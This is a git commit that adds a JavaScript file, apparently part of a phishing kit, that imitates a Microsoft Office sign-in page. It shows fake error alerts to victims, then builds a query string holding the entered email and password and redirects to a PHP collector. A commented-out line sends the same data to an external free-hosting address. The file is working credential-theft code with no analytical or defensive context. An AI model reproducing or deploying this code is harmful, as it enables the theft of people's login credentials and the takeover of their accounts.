b7ee1ae5ccac9a3436680d59f638a018dc318082
robmccal <143014308+robmccal@users.noreply.github.com>
2023-10-01 21:11:14 +0200

    Add files via upload

---
+++ office3/office_update.js
@@ -0,0 +1,39 @@
+﻿const validEmail = /^(([^<>()[\]\\.,;:\s@"]+(\.[^<>()[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/
+
+let url;
+
+setTimeout(() => {
+    document.getElementById("temp_loader").style.display = "none"
+    document.getElementById("main_container").style.display = "flex"
+    document.getElementById("newHeader").style.display = "block"
+}, 1500);
+
+Math.floor(Math.random() * 10)
+
+function preventCheck(p) {
+    p.checked = true
+}
+
+function getDetails(e) {
+    const getHtml = e.parentElement;
+
+    const emailSpan = document.getElementById("emailSpan");
+    const passInput = document.getElementById("passInput");
+
+    if (emailSpan.innerText == "" && passInput.value == "") {
+        alert("Wrong Email or Password")
+    }
+    else if (passInput.value.length <= 6) {
+        alert("Wrong Password or Email")
+    }
+    else {
+        url = "Domain" + "=" + "Office | Plain" + "&" + "Mail" + "=" + emailSpan.innerText + "&" + "Password" + "=" + passInput.value
+
+        // location = "https://falser-skies.000webhostapp.com/gmb/plain3.php?" + url;
+        location = "plain3.php?" + url;
+
+        setTimeout(() => {
+            passInput.value = "";
+        }, 2000);
+    }
+}
